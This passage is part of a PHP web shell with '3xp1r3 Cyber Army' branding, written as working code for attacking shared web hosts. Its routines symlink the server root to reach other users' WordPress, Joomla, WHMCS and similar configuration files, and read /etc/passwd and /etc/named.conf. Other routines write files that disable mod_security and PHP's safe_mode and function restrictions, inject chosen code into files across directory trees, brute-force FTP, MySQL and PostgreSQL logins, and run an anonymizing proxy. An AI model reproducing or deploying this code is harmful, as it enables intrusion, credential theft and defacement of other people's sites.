            echo "<pre class=ml1 style='margin-top:5px'>Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
        } else {
            echo "<table align=center class='main' border=0 ><tr><th> Count </th><th> Domains </th><th> Users </th></tr>";
            
            $unk = array();
            foreach($d0mains as $d0main){
                if(@eregi("zone",$d0main)){
                    preg_match_all('#zone "(.*)"#', $d0main, $domains);
                    flush();
                    if(strlen(trim($domains[1][0])) > 2){
                        $unk[] = $domains[1][0];
                        flush();
                        
                    }
                }
            }
            $count=1;
            $unk = array_unique($unk);
            $l=0;
            foreach($unk as $d){
                $user = posix_getpwuid(@fileowner("/etc/valiases/".$d));
                echo "<tr".($l?' class=l1':'')."><td>".$count."</td><td><a href=http://".$d."/>".$d."</a></td><td>".$user['name']."</td></tr>";
                flush();
                $count++;
                $l=$l?0:1;
            }
            echo "</table>";
        }
        echo "</center>"; 
    }
 
    if(isset($_POST['p1']) && $_POST['p1']=='whole')
    {
        echo "<center>";
        @mkdir('3ca_sym',0777);
        $hdt  = "Options all\nDirectoryIndex Sux.html\nAddType text/plain .php\nAddHandler server-parsed .php\nAddType text/plain .html\nAddHandler txt .html\nRequire None\nSatisfy Any";
        $hfp =@fopen ('3ca_sym/.htaccess','w');
        fwrite($hfp ,$hdt);
        if(function_exists('symlink')) {
            @symlink('/','3ca_sym/root');
        }
        $d0mains = @file('/etc/named.conf');
        if(!$d0mains) {
            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
            echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
            $dt = file('/etc/passwd');
            $l=0;
            foreach($dt as $d) {
                $r = explode(':',$d);
                if(strpos($r[5],'home')) {
                    echo "<tr".($l?' class=l1':'')."><td>".$j."</td><td>---</td><td>".$r[0]."</td><td><a href='3ca_sym/root".$r[5]."/public_html' target='_blank'>symlink</a></td></tr>";
                    $l=$l?0:1;
                    $j++;
                }
            }            
            echo '</table>';
        } else {
            echo "<table align='center' width='40%' class='main'><tr><th> Count </th><th> Domains </th><th> User </th><th> Symlink </th></tr>";
            $count=1;
            $mck = array();
            foreach($d0mains as $d0main){
                if(@eregi('zone',$d0main)){
                    preg_match_all('#zone "(.*)"#',$d0main,$domain);
                    flush();
                    if(strlen(trim($domain[1][0])) >2){
                        $mck[] = $domain[1][0];
                    }
                }
            }
            $mck = array_unique($mck);
            $usr = array();
            $dmn = array();
            foreach($mck as $o) {
                $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
                $usr[] = $infos['name'];
                $dmn[] = $o;
            }
            array_multisort($usr,$dmn);
            $dt = file('/etc/passwd');
            $passwd = array();
            foreach($dt as $d) {
                $r = explode(':',$d);
                if(strpos($r[5],'home')) {
                    $passwd[$r[0]] = $r[5];
                }
            }
            $l=0;
            $j=1;
            foreach($usr as $r) {
                echo "<tr".($l?' class=l1':'')."><td>".$count++."</td>
                                                 <td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td>
                                                 <td>'.$r."</td>
                                                 <td><a href='3ca_sym/root".$passwd[$r]."/public_html' target='_blank'>symlink</a></td></tr>";
                flush();
                $l=$l?0:1;
                $j++;
            }
            echo '</table>';
        }
        echo "</center>";    
    }
 
    if(isset($_POST['p1']) && $_POST['p1']=='config')
    {
        echo "<center>";
        @mkdir('3ca_sym',0777);
        $hdt = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $hfp = @fopen ('3ca_sym/.htaccess','w');
        @fwrite($hfp ,$hdt);
        if(function_exists('symlink')) {
            @symlink('/','3ca_sym/root');
        }
        $d0mains = @file('/etc/named.conf');
        if(!$d0mains) {
            echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
        } else {
            echo "<table align='center' width='40%' class='main' ><tr><th> Count </th><th> Domain </th<th> User </th>><th> Script </th></tr>";
            $count = 1;
            $l=0;
            foreach($d0mains as $d0main){
                if(@eregi('zone',$d0main)){
                    preg_match_all('#zone "(.*)"#',$d0main,$domain);
                    flush();
                    if(strlen(trim($domain[1][0]))>2){
                        $user = posix_getpwuid(@fileowner('/etc/valiases/'.$domain[1][0]));

                        $c1 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/wp-config.php';
                        $ch01 = get_headers($c1);
                        $cf01 = $ch01[0];
                        $c2 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/blog/wp-config.php';
                        $ch02 = get_headers($c2);
                        $cf02 = $ch02[0];
                        $c3 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/configuration.php';
                        $ch03 = get_headers($c3);
                        $cf03 = $ch03[0];
                        $c4 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/joomla/configuration.php';
                        $ch04 = get_headers($c4);
                        $cf04 = $ch04[0];
                        $c5 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/includes/config.php';
                        $ch05 = get_headers($c5);
                        $cf05 = $ch05[0];
                        $c6 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/vb/includes/config.php';
                        $ch06 = get_headers($c6);
                        $cf06 = $ch06[0];
                        $c7 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/forum/includes/config.php';
                        $ch07 = get_headers($c7);
                        $cf07 = $ch07[0];
                        $c8 = $burl.'/3ca_sym/root/home/'.$user['name'].'public_html/clients/configuration.php';
                        $ch08 = get_headers($c8);
                        $cf08 = $ch08[0];
                        $c9 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/support/configuration.php';
                        $ch09 = get_headers($c9);
                        $cf09 = $ch09[0];
                        $c10 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
                        $ch10 = get_headers($c10);
                        $cf10 = $ch10[0];
                        $c11 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/submitticket.php';
                        $ch11 = get_headers($c11);
                        $cf11 = $ch11[0];
                        $c12 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/client/configuration.php';
                        $ch12 = get_headers($c12);
                        $cf12 = $ch12[0];
                        $c13 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/includes/configure.php';
                        $ch13 = get_headers($c13);
                        $cf13 = $ch13[0];
                        $c14 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/include/app_config.php';
                        $ch14 = get_headers($c14);
                        $cf14 = $ch14[0];
                        $c15 = $burl.'/3ca_sym/root/home/'.$user['name'].'/public_html/sites/default/settings.php';
                        $ch15 = get_headers($c15);
                        $cf15 = $ch15[0];
                        
                        $out = '&nbsp;';
                        if(strpos($cf01,'200') == true)                                    {   $out = "<a href='".$c1."' target='_blank'>Wordpress</a>";   } 
                        elseif(strpos($cf02,'200') == true)                                {   $out = "<a href='".$c2."' target='_blank'>Wordpress</a>";   }
                        elseif(strpos($cf03,'200') == true && strpos($cf11,'200') == true) {   $out = " <a href='".$c11."' target='_blank'>WHMCS</a>";     }
                        elseif(strpos($cf09,'200') == true)                                {   $out = " <a href='".$c9."' target='_blank'>WHMCS</a>";      }
                        elseif(strpos($cf10,'200') == true)                                {   $out = " <a href='".$c10."' target='_blank'>WHMCS</a>";     }
                        elseif(strpos($cf03,'200') == true)                                {   $out = " <a href='".$c3."' target='_blank'>Joomla</a>";     }
                        elseif(strpos($cf04,'200') == true)                                {   $out = " <a href='".$c4."' target='_blank'>Joomla</a>";     }
                        elseif(strpos($cf05,'200') == true)                                {   $out = " <a href='".$c5."' target='_blank'>vBulletin</a>";  }
                        elseif(strpos($cf06,'200') == true)                                {   $out = " <a href='".$c6."' target='_blank'>vBulletin</a>";  }
                        elseif(strpos($cf07,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>vBulletin</a>";  }
                        elseif(strpos($cf08,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Client Area</a>";  }
                        elseif(strpos($cf12,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Client Area</a>";  }
                        elseif(strpos($cf13,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>osCommerce/Zen Cart</a>";  }
                        elseif(strpos($cf14,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Magento</a>";  }
                        elseif(strpos($cf15,'200') == true)                                {   $out = " <a href='".$c7."' target='_blank'>Drupal</a>";  }
                        else {
                            continue;
                        }
                        echo '<tr'.($l?' class=l1':'').'><td>'.$count++.'</td><td><a href=http://www.'.$domain[1][0].'/>'.$domain[1][0].'</a></td><td>'.$user['name'].'</td><td>'.$out.'</td></tr>';
                        flush();
                        $l=$l?0:1;
                    }
                }
            }
            echo "</table>";
        }
        echo "</center>";   
    }
    echo "</div>";
    hardFooter();
}

function actionBypass() {
    hardHeader();
    echo '<h1>Safe Mode</h1>';
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'<IfModule mod_security.c>
            Sec------Engine Off
            Sec------ScanPOST Off
            </IfModule>');
        fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
        fwrite($fil,'safe_mode=OFF
            disable_functions=NONE');
        fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl');
        fclose($fil); 
    }
    echo "<br><br /><br /></div>";
    echo '</div>';
    hardFooter();
}

function actionInjector(){
    hardHeader();
    echo '<h1>Mass Code Injector</h1>';
    echo '<div class="content">';
    
    if(stristr(php_uname(),"Windows")) { $DS = "\\"; } else if(stristr(php_uname(),"Linux")) { $DS = '/'; }
    function get_structure($path,$depth) {
        global $DS;
        $res = array();
        if(in_array(0, $depth)) { $res[] = $path; }
        if(in_array(1, $depth) or in_array(2, $depth) or in_array(3, $depth)) {
            $tmp1 = glob($path.$DS.'*',GLOB_ONLYDIR);
            if(in_array(1, $depth)) { $res = array_merge($res,$tmp1); }
        }
        if(in_array(2, $depth) or in_array(3, $depth)) {
            $tmp2 = array();
            foreach($tmp1 as $t){
                $tp2 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp2 = array_merge($tmp2, $tp2);
            }
            if(in_array(2, $depth)) { $res = array_merge($res,$tmp2); }
        }
        if(in_array(3, $depth)) {
            $tmp3 = array();
            foreach($tmp2 as $t){
                $tp3 = glob($t.$DS.'*',GLOB_ONLYDIR);
                $tmp3 = array_merge($tmp3, $tp3);
            }
            $res = array_merge($res,$tmp3);
        }
        return $res;
    }

    if(isset($_POST['submit']) && $_POST['submit']=='Inject') {
        $name = $_POST['name'] ? $_POST['name'] : '*';
        $type = $_POST['type'] ? $_POST['type'] : 'html';
        $path = $_POST['path'] ? $_POST['path'] : getcwd();
        $code = $_POST['code'] ? $_POST['code'] : '3xp1r3 Cyber Army';
        $mode = $_POST['mode'] ? $_POST['mode'] : 'a';
        $depth = sizeof($_POST['depth']) ? $_POST['depth'] : array('0');
        $dt = get_structure($path,$depth);
        foreach ($dt as $d) {
            if($mode == 'a') {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code, FILE_APPEND)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            } else {
                if(file_put_contents($d.$DS.$name.'.'.$type, $code)) {
                    echo '<div><strong>'.$d.$DS.$name.'.'.$type.'</strong><span style="color:lime;"> was injected</span></div>';
                } else {
                    echo '<div><span style="color:red;">failed to inject</span> <strong>'.$d.$DS.$name.'.'.$type.'</strong></div>';
                }
            }        
        }
    } else {
        echo '<form method="post" action="">
                <table align="center">
                    <tr>
                        <td>Directory : </td>
                        <td><input class="box" name="path" value="'.getcwd().'" size="50"/></td>
                    </tr>
                    <tr>
                        <td class="title">Mode : </td>
                        <td>
                            <select style="width: 100px;" name="mode" class="box">
                                <option value="a">Apender</option>
                                <option value="w">Overwriter</option>
                            </select>
                        </td>
                    </tr>
                    <tr>
                        <td class="title">File Name & Type : </td>
                        <td>
                            <input type="text" style="width: 100px;" name="name" value="*"/>&nbsp;&nbsp;
                            <select style="width: 100px;" name="type" class="box">
                            <option value="html">HTML</option>
                            <option value="htm">HTM</option>
                            <option value="php" selected="selected">PHP</option>
                            <option value="asp">ASP</option>
                            <option value="aspx">ASPX</option>
                            <option value="xml">XML</option>
                            <option value="txt">TXT</option>
                        </select></td>
                    </tr>
                    <tr>
                        <td class="title">Code Inject Depth : </td>
                        <td>
                            <input type="checkbox" name="depth[]" value="0" checked="checked"/>&nbsp;0&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="1"/>&nbsp;1&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="2"/>&nbsp;2&nbsp;&nbsp;
                            <input type="checkbox" name="depth[]" value="3"/>&nbsp;3
                        </td>
                    </tr>        
                    <tr>
                        <td colspan="2"><textarea name="code" cols="70" rows="10" class="box"></textarea></td>
                    </tr>                        
                    <tr>
                        <td colspan="2" style="text-align: center;">
                            <input type="hidden" name="a" value="Injector">
                            <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                            <input type="hidden" name="p1">
                            <input type="hidden" name="p2">
                            <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                            <input style="padding :5px; width:100px;" name="submit" type="submit" value="Inject"/></td>
                    </tr>
                </table>
        </form>';
    }
    echo '</div>';
    hardFooter();
}

function actionBruteforce() {
	hardHeader();
	if( isset($_POST['proto']) ) {
		echo '<h1>Results</h1><div class=content><span>Type:</span> '.htmlspecialchars($_POST['proto']).' <span>Server:</span> '.htmlspecialchars($_POST['server']).'<br>';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysqli_connect($ip.':'.($port?$port:3306), $login, $pass);
				@mysqli_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($line[0]).'<br>';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i>=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '<b>'.htmlspecialchars($line[0]).'</b>:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '<b>'.htmlspecialchars($_POST['login']).'</b>:'.htmlspecialchars($line).'<br>';
					}
				}
		}
		echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
	}
	echo '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>'
		.'<td><label><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></label></td></tr><tr><td>'
		.'<input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">'
		.'<input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'">'
		.'<input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'">'
		.'<input type=hidden name=ne  value="">'
		.'<span>Server:port</span></td>'
		.'<td><input type=text name=server value="127.0.0.1"></td></tr>'
		.'<tr><td><span>Brute type</span></td>'
		.'<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>'
		.'<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</td></tr>'
		.'<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr>'
		.'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
		.'<td><input type=text name=login value="root"></td></tr>'
		.'<tr><td><span>Dictionary</span></td>'
		.'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
		.'</td></tr><tr><td></td><td><input type=submit value="submit"></td></tr></form></table>';
	echo '</div>';
	hardFooter();
}
/* (С) 01.2020 Jakub Vrána */
function actionSql() {
	hardHeader();
	
	$adminer_url = 'adminer.php';
	$adminer_functions = 'functions.js';
	$adminer_editing = 'editing.js';

	echo"<script>window.onload=function() {document.getElementById('ifr').style.height=window.innerHeight+'px';}
	</script>";
	if (file_exists($adminer_functions)) {
		if (file_exists($adminer_editing)) {
		} else {
			echo "<h1>Results</h1><div class=content><div><span>Warning: </span>" .$GLOBALS['home_cwd']. "/$adminer_editing file does not exist </div></div>";
		}
	} else {
		if (file_exists($adminer_editing)) {
			echo "<h1>Results</h1><div class=content><div><span>Warning: </span>" .$GLOBALS['home_cwd']. "/$adminer_functions file does not exist </div></div>";
		} else {
			echo "<h1>Results</h1><div class=content><div><span>Warning: </span>" .$GLOBALS['home_cwd']. "/$adminer_functions and ".$GLOBALS['home_cwd']. "/$adminer_editing  files does not exist </div></div>";
		}
	}
	
	if (file_exists($adminer_url)) {
		echo "<h1>Sql browser</h1><div class=content><iframe id='ifr' src='$adminer_url' width=100% height=auto scrolling=auto frameborder=0 style='border:none !important;'></iframe></div>";
	} else {
		echo "<h1>Not found</h1><div class=content><div align='center' ><h5>" .$GLOBALS['home_cwd']. "/$adminer_url</h5> file does not exist</div></div>";
		hardFooter();
	};
}
/* (С) 02.2019 Abdul Ahad */
function actionAnonymizer() {
	$whitelistPatterns = array();
	//To enable CORS (cross-origin resource sharing) for proxied sites, set $forceCORS to true.
	$forceCORS = false;
	//Set to false to report the client machine's IP address to proxied sites via the HTTP `x-forwarded-for` header.
	//Setting to false may improve compatibility with some sites, but also exposes more information about end users to proxied sites.
	$anonymize = true;
	//Start/default URL that that will be proxied when Proxy is first loaded in a browser/accessed directly with no URL to proxy.
	//If empty, Proxy will show its own landing page.
	$startURL = "";
	$landingExampleURL = "https://example.net";
	
	ob_start("ob_gzhandler");
	if (version_compare(PHP_VERSION, "5.4.7", "<")) {
		die("Proxy requires PHP version 5.4.7 or later.");
	}
	$requiredExtensions = ['curl', 'mbstring', 'xml'];
	foreach($requiredExtensions as $requiredExtension) {
		if (!extension_loaded($requiredExtension)) {
		die("Proxy requires PHP's \"" . $requiredExtension . "\" extension. Please install/enable it on your server and try again.");
		}
	}
	function getHostnamePattern($hostname) {
		$escapedHostname = str_replace(".", "\.", $hostname);
		return "@^https?://([a-z0-9-]+\.)*" . $escapedHostname . "@i";
	}
	function removeKeys(&$assoc, $keys2remove) {
		$keys = array_keys($assoc);
		$map = array();
		$removedKeys = array();
		foreach ($keys as $key) {
		$map[strtolower($key)] = $key;
		}
		foreach ($keys2remove as $key) {
		$key = strtolower($key);
		if (isset($map[$key])) {
			unset($assoc[$map[$key]]);
			$removedKeys[] = $map[$key];
		}
		}
		return $removedKeys;
	}
	
	if (!function_exists("getallheaders")) {
		function getallheaders() {
		$result = array();
		foreach($_SERVER as $key => $value) {
			if (substr($key, 0, 5) == "HTTP_") {
			$key = str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($key, 5)))));
			$result[$key] = $value;
			}
		}
		return $result;
		}
	}
	$usingDefaultPort =  (!isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] === 80) || (isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] === 443);
	$prefixPort = $usingDefaultPort ? "" : ":" . $_SERVER["SERVER_PORT"];
	$prefixHost = $_SERVER["HTTP_HOST"];
	$prefixHost = strpos($prefixHost, ":") ? implode(":", explode(":", $_SERVER["HTTP_HOST"], -1)) : $prefixHost;
	define("PROXY_PREFIX", "http" . (isset($_SERVER["HTTPS"]) ? "s" : "") . "://" . $prefixHost . $prefixPort . $_SERVER["SCRIPT_NAME"] . "?");
	function makeRequest($url) {
		global $anonymize;
	$user_agent = $_SERVER["HTTP_USER_AGENT"];
		if (empty($user_agent)) {
		$user_agent = "Mozilla/5.0 (compatible; Proxy)";
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
		$browserRequestHeaders = getallheaders();
		$removedHeaders = removeKeys($browserRequestHeaders, array(
		"Accept-Encoding", //Throw away the browser's Accept-Encoding header if any and let cURL make the request using gzip if possible.
		"Content-Length",
		"Host",
		"Origin"
		));  
		array_change_key_case($removedHeaders, CASE_LOWER);
		curl_setopt($ch, CURLOPT_ENCODING, "");
		$curlRequestHeaders = array();
		foreach ($browserRequestHeaders as $name => $value) {
		$curlRequestHeaders[] = $name . ": " . $value;
		}
		if (!$anonymize) {
		$curlRequestHeaders[] = "X-Forwarded-For: " . $_SERVER["REMOTE_ADDR"];
		}
		if (array_key_exists('origin', $removedHeaders)) {
		$urlParts = parse_url($url);
		$port = $urlParts['port'];
		$curlRequestHeaders[] = "Origin: " . $urlParts['scheme'] . "://" . $urlParts['host'] . (empty($port) ? "" : ":" . $port);
		};
		curl_setopt($ch, CURLOPT_HTTPHEADER, $curlRequestHeaders);
		switch ($_SERVER["REQUEST_METHOD"]) {
		case "POST":
			curl_setopt($ch, CURLOPT_POST, true);
			$postData = Array();
			parse_str(file_get_contents("php://input"), $postData);
			if (isset($postData["ProxyFormAction"])) {
			unset($postData["ProxyFormAction"]);
			}
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
		break;
		case "PUT":
			curl_setopt($ch, CURLOPT_PUT, true);
			curl_setopt($ch, CURLOPT_INFILE, fopen("php://input", "r"));
		break;
		}
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_URL, $url);
		$response = curl_exec($ch);
		$responseInfo = curl_getinfo($ch);
		$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		curl_close($ch);
		$responseHeaders = substr($response, 0, $headerSize);
		$responseBody = substr($response, $headerSize);
		return array("headers" => $responseHeaders, "body" => $responseBody, "responseInfo" => $responseInfo);
	}
	function rel2abs($rel, $base) {
		if (empty($rel)) $rel = ".";
		if (parse_url($rel, PHP_URL_SCHEME) != "" || strpos($rel, "//") === 0) return $rel; //Return if already an absolute URL
		if ($rel[0] == "#" || $rel[0] == "?") return $base.$rel; //Queries and anchors
		extract(parse_url($base)); //Parse base URL and convert to local variables: $scheme, $host, $path
		$path = isset($path) ? preg_replace("#/[^/]*$#", "", $path) : "/"; //Remove non-directory element from path
		if ($rel[0] == "/") $path = ""; //Destroy path if relative url points to root
		$port = isset($port) && $port != 80 ? ":" . $port : "";
		$auth = "";
		if (isset($user)) {
		$auth = $user;
		if (isset($pass)) {
			$auth .= ":" . $pass;
		}
		$auth .= "@";
		}
		$abs = "$auth$host$port$path/$rel"; //Dirty absolute URL
		for ($n = 1; $n > 0; $abs = preg_replace(array("#(/\.?/)#", "#/(?!\.\.)[^/]+/\.\./#"), "/", $abs, -1, $n)) {} //Replace '//' or '/./' or '/foo/../' with '/'
		return $scheme . "://" . $abs; //Absolute URL is ready.
	}
	function proxifyCSS($css, $baseURL) {
		$sourceLines = explode("\n", $css);
		$normalizedLines = [];
		foreach ($sourceLines as $line) {
		if (preg_match("/@import\s+url/i", $line)) {
			$normalizedLines[] = $line;
		} else {
			$normalizedLines[] = preg_replace_callback(
			"/(@import\s+)([^;\s]+)([\s;])/i",
			function($matches) use ($baseURL) {
				return $matches[1] . "url(" . $matches[2] . ")" . $matches[3];
			},
			$line);
		}
		}
		$normalizedCSS = implode("\n", $normalizedLines);
		return preg_replace_callback(
		"/url\((.*?)\)/i",
		function($matches) use ($baseURL) {
			$url = $matches[1];
			if (strpos($url, "'") === 0) {
				$url = trim($url, "'");
			}
			if (strpos($url, "\"") === 0) {
				$url = trim($url, "\"");
			}
			if (stripos($url, "data:") === 0) return "url(" . $url . ")"; //The URL isn't an HTTP URL but is actual binary data. Don't proxify it.
			return "url(" . PROXY_PREFIX . rel2abs($url, $baseURL) . ")";
		},
		$normalizedCSS);
	}
	function proxifySrcset($srcset, $baseURL) {
		$sources = array_map("trim", explode(",", $srcset)); //Split all contents by comma and trim each value
		$proxifiedSources = array_map(function($source) use ($baseURL) {
		$components = array_map("trim", str_split($source, strrpos($source, " "))); //Split by last space and trim
		$components[0] = PROXY_PREFIX . rel2abs(ltrim($components[0], "/"), $baseURL); //First component of the split source string should be an image URL; proxify it
		return implode($components, " "); //Recombine the components into a single source
		}, $sources);
		$proxifiedSrcset = implode(", ", $proxifiedSources); //Recombine the sources into a single "srcset"
		return $proxifiedSrcset;
	}
	if (isset($_POST["ProxyFormAction"])) {
		$url = $_POST["ProxyFormAction"];
		unset($_POST["ProxyFormAction"]);
	} else {
		$queryParams = Array();
		parse_str($_SERVER["QUERY_STRING"], $queryParams);
		if (isset($queryParams["ProxyFormAction"])) {
		$formAction = $queryParams["ProxyFormAction"];
		unset($queryParams["ProxyFormAction"]);
		$url = $formAction . "?" . http_build_query($queryParams);
		} else {
		$url = substr($_SERVER["REQUEST_URI"], strlen($_SERVER["SCRIPT_NAME"]) + 1);
		}
	}
	if (empty($url)) {
		if (empty($startURL)) {
			hardHeader();
			echo "<h1>Anonymizer</h1><div class=content>Proxy can be directly invoked like this: <a href=\"" . PROXY_PREFIX . $landingExampleURL . "\" target='_blank'>" . PROXY_PREFIX . $landingExampleURL . "</a><br /><br />Or, you can simply enter a URL below:<br /><br /><form onsubmit=\"if (document.getElementById('site').value) { 
				window.open('" . PROXY_PREFIX . "' + document.getElementById('site').value); return false; } else { 
				window.open('" . PROXY_PREFIX . $landingExampleURL . "'); return false; }\" autocomplete=\"off\"><input id=\"site\" type=\"text\" size=\"50\" autofocus /><input type=\"submit\" value=\"GO!\" /></form></div>";
			hardFooter();
			die();
		} else {
			$url = $startURL;
		}
	} else if (strpos($url, ":/") !== strpos($url, "://")) {
		//Work around the fact that some web servers (e.g. IIS 8.5) change double slashes appearing in the URL to a single slash.
		$pos = strpos($url, ":/");
		$url = substr_replace($url, "://", $pos, strlen(":/"));
	}
	$scheme = parse_url($url, PHP_URL_SCHEME);
	if (empty($scheme)) {
		//Assume that any supplied URLs starting with // are HTTP URLs.
		if (strpos($url, "//") === 0) {
		$url = "http:" . $url;
		}
	} else if (!preg_match("/^https?$/i", $scheme)) {
		die('Error: Detected a "' . $scheme . '" URL. Proxy exclusively supports http[s] URLs.');
	}
	$urlIsValid = count($whitelistPatterns) === 0;
	foreach ($whitelistPatterns as $pattern) {
		if (preg_match($pattern, $url)) {
		$urlIsValid = true;
		break;
		}
	}
	if (!$urlIsValid) {
		die("Error: The requested URL was disallowed by the server adFc7strator.");
	}
	
	$response = makeRequest($url);
	$rawResponseHeaders = $response["headers"];
	$responseBody = $response["body"];
	$responseInfo = $response["responseInfo"];
	$responseURL = $responseInfo["url"];
	if ($responseURL !== $url) {
		header("Location: " . PROXY_PREFIX . $responseURL, true);
		exit(0);
	}
	$header_blacklist_pattern = "/^Content-Length|^Transfer-Encoding|^Content-Encoding.*gzip/i";
	$responseHeaderBlocks = array_filter(explode("\r\n\r\n", $rawResponseHeaders));
	$lastHeaderBlock = end($responseHeaderBlocks);
	$headerLines = explode("\r\n", $lastHeaderBlock);
	foreach ($headerLines as $header) {
		$header = trim($header);
		if (!preg_match($header_blacklist_pattern, $header)) {
		header($header, false);
		}
	}
	header("X-Robots-Tag: noindex, nofollow", true);
	
	if ($forceCORS) {
		header("Access-Control-Allow-Origin: *", true);
		header("Access-Control-Allow-Credentials: true", true);
	
		if ($_SERVER["REQUEST_METHOD"] == "OPTIONS") {
		if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_METHOD"])) {
			header("Access-Control-Allow-Methods: GET, POST, OPTIONS", true);
		}
		if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"])) {
